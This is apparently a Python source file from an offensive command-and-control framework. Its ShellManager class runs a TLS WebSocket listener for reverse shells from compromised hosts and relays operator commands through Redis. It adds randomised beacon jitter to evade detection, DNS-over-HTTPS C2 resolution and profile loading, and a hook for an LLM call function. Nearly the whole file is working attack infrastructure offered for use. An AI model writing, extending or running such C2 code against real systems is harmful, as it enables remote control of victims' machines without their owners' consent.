import asyncio
import ssl
import uuid
import os
import subprocess
import random
import redis.asyncio as redis
from aiohttp import web, WSCloseCode

from core.logger import log
from config import settings
from core.doh_channel import DoHChannel
from core.context_manager import ContextManager # Import ContextManager
from core.c2_profiles import get_profile as get_c2_profile


class ShellManager:
    def __init__(self, context_manager: ContextManager): # Accept context_manager
        self.context_manager = context_manager
        self.db_manager = None # Will be fetched from context_manager
        self.llm_call_function = None # Will be fetched from context_manager
        self.running = False
        self.host = '0.0.0.0'
        self.port = 8080
        self.active_shells = {}
        self.cert_path = os.path.join(
            settings.WORKSPACE_DIR, 'database', 'c2.pem')
        self.redis_key_prefix = "dlnk_shell"
        self.r = redis.Redis(host='localhost', port=6379,
                             db=0, decode_responses=True)

        # C2 Jitter Configuration (will be overridden by profile)
        self.min_beacon_interval = 1.0  # Minimum time in seconds for beaconing
        self.max_beacon_interval = 5.0  # Maximum time in seconds for beaconing
        self.c2_profile = {} # Store the active C2 profile

        # aiohttp app setup
        self.app = web.Application()
        self.app.router.add_get('/ws', self.websocket_handler)
        self.runner = None
        self.site = None

        # DoH C2 Channel setup
        self.doh_channel = DoHChannel(self.app, self.r)

    async def setup(self): # Add an async setup method
        self.db_manager = await self.context_manager.get_context('db_manager')
        self.llm_call_function = await self.context_manager.get_context('llm_call_function')
        
        c2_profile_name = await self.context_manager.get_context('c2_profile_name') # Get profile name from context
        self.c2_profile = get_c2_profile(c2_profile_name or "default") # Load C2 profile

        # Update jitter from C2 profile if available
        if "min_beacon_interval" in self.c2_profile:
            self.min_beacon_interval = self.c2_profile["min_beacon_interval"]
        if "max_beacon_interval" in self.c2_profile:
            self.max_beacon_interval = self.c2_profile["max_beacon_interval"]

    def _generate_self_signed_cert(self):
        if not os.path.exists(self.cert_path):
            log.info(
                f"Generating self-signed certificate at {self.cert_path}...")
            os.makedirs(os.path.dirname(self.cert_path), exist_ok=True)
            command = [
                'openssl', 'req', '-new', '-x509', '-days', '3650', '-nodes',
                '-out', self.cert_path, '-keyout', self.cert_path,
                '-subj', '/C=US/ST=CA/L=./O=./CN=.'
            ]
            try:
                subprocess.run(command, check=True,
                               capture_output=True, text=True)
                log.success("Self-signed certificate generated successfully.")
            except (subprocess.CalledProcessError, FileNotFoundError) as e:
                log.critical(
                    f"Failed to generate self-signed certificate with OpenSSL: {e}")
                raise

    async def start_listener(self, port: int):
        if self.running:
            log.warning("Shell listener is already running.")
            return

        self.port = port
        self._generate_self_signed_cert()

        # Check C2 profile for DoH settings
        if self.c2_profile.get("use_doh", False):
            log.info("C2 profile specifies using DoH for C2 host resolution.")
            resolved_ip = await self.doh_channel.resolve_c2_domain()
            if resolved_ip:
                self.host = resolved_ip # Use resolved IP for binding
                log.success(f"C2 host resolved to {self.host} via DoH.")
            else:
                log.error("Failed to resolve C2 host via DoH. Falling back to default host.")
                self.host = '0.0.0.0' # Fallback

        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.cert_path)

        self.runner = web.AppRunner(self.app)
        await self.runner.setup()
        self.site = web.TCPSite(self.runner, self.host,
                                self.port, ssl_context=ssl_context)

        await self.site.start()
        self.running = True
        log.success(
            f"[ShellManager] Secure WebSocket listener started on https://{self.host}:{self.port}/ws")

    async def websocket_handler(self, request):
        host_header = request.headers.get('Host', 'Unknown')
        log.info(
            f"Incoming WebSocket connection from {request.remote}. Host Header: {host_header}")

        ws = web.WebSocketResponse()
        await ws.prepare(request)

        shell_id = str(uuid.uuid4())
        peername = request.remote
        log.success(
            f"[ShellManager] New WebSocket shell connected from {peername}. Assigned ID: {shell_id}")

        self.active_shells[shell_id] = ws
        await self.r.hset(f"{self.redis_key_prefix}:shells", shell_id, str(peername))

        input_task = asyncio.create_task(
            self._redis_input_listener(shell_id, ws))
        output_task = asyncio.create_task(
            self._shell_output_reader(shell_id, ws))

        await asyncio.gather(input_task, output_task, return_exceptions=True)

        log.warning(f"[Shell {shell_id} Connection closed.")
        if shell_id in self.active_shells:
            del self.active_shells[shell_id]
        await self.r.hdel(f"{self.redis_key_prefix}:shells", shell_id)

        return ws

    async def _redis_input_listener(self, shell_id: str, ws: web.WebSocketResponse):
        input_key = f"{self.redis_key_prefix}:shell_input:{shell_id}"
        log.info(
            f"[Shell {shell_id} Starting Redis input listener on key '{input_key}' with jitter.")
        try:
            while not ws.closed:
                beacon_interval = random.uniform(
                    self.min_beacon_interval, self.max_beacon_interval)
                command_tuple = await self.r.brpop(input_key, timeout=beacon_interval)

                if command_tuple:
                    _, command_data = command_tuple
                    command = command_data if command_data.endswith(
                        '\n') else command_data + '\n'
                    await ws.send_str(command)
                    log.info(
                        f"[Shell {shell_id} Sent command after {beacon_interval:.2f}s wait.")
        except asyncio.CancelledError:
            log.warning(f"[Shell {shell_id} Redis input listener cancelled.")
        except Exception as e:
            log.error(f"[Shell {shell_id} Error in Redis input listener: {e}")
        finally:
            log.warning(f"[Shell {shell_id} Redis input listener stopped.")

    async def _shell_output_reader(self, shell_id: str, ws: web.WebSocketResponse):
        output_channel = f"{self.redis_key_prefix}:shell_output:{shell_id}"
        log.info(
            f"[Shell {shell_id} Starting shell output reader to channel '{output_channel}'")
        try:
            async for msg in ws:
                if msg.type == web.WSMsgType.TEXT or msg.type == web.WSMsgType.BINARY:
                    await self.r.publish(output_channel, msg.data)
                elif msg.type == web.WSMsgType.ERROR:
                    log.error(
                        f"[Shell {shell_id} WebSocket connection closed with exception {ws.exception()}")
                    break
        except asyncio.CancelledError:
            log.warning(f"[Shell {shell_id} Shell output reader cancelled.")
        except Exception as e:
            log.error(f"[Shell {shell_id} Error in shell output reader: {e}")
        finally:
            log.warning(f"[Shell {shell_id} Shell output reader stopped.")

    async def list_shells(self) -> dict:
        return await self.r.hgetall(f"{self.redis_key_prefix}:shells")

    async def send_command(self, shell_id: str, command: str, timeout: int = 10) -> str:
        if not await self.r.hexists(f"{self.redis_key_prefix}:shells", shell_id):
            return f"Error: Shell ID '{shell_id}' not found."

        input_key = f"{self.redis_key_prefix}:shell_input:{shell_id}"
        output_channel = f"{self.redis_key_prefix}:shell_output:{shell_id}"
        output_buffer = []
        marker = str(uuid.uuid4())
        command_with_marker = f"{command.strip()}; echo {marker}\n"

        pubsub = self.r.pubsub()
        await pubsub.subscribe(output_channel)

        try:
            await self.r.lpush(input_key, command_with_marker)
            log.info(f"[Shell {shell_id} Sent command: {command.strip()}")

            while True:
                message = await pubsub.get_message(ignore_subscribe_messages=True, timeout=timeout)
                if message is None:
                    log.warning(f"[Shell {shell_id} Command timed out.")
                    break

                data = message['data']
                output_buffer.append(data)
                if marker in data:
                    break

            full_output = "".join(output_buffer)
            return full_output.replace(marker, "").strip()
        except Exception as e:
            log.error(
                f"[Shell {shell_id} Unexpected error in send_command: {e}")
            return f"Error: An unexpected error occurred: {e}"
        finally:
            await pubsub.unsubscribe(output_channel)
            await pubsub.close()

    async def close(self):
        log.info("[ShellManager] Shutting down...")
        self.running = False

        for shell_id, ws in list(self.active_shells.items()):
            log.info(f"Closing shell {shell_id}...")
            await ws.close(code=WSCloseCode.GOING_AWAY, message='Server shutdown')
        self.active_shells.clear()

        if self.site:
            await self.site.stop()
        if self.runner:
            await self.runner.cleanup()

        if self.r:
            log.info("Clearing shell keys from Redis...")
            shell_ids = await self.r.hkeys(f"{self.redis_key_prefix}:shells")
            if shell_ids:
                # Create a pipeline to delete all related keys
                pipe = self.r.pipeline()
                pipe.delete(f"{self.redis_key_prefix}:shells")
                for shell_id in shell_ids:
                    pipe.delete(
                        f"{self.redis_key_prefix}:shell_input:{shell_id}")
                await pipe.execute()
            await self.r.close()

        log.success("[ShellManager] Shutdown complete.")
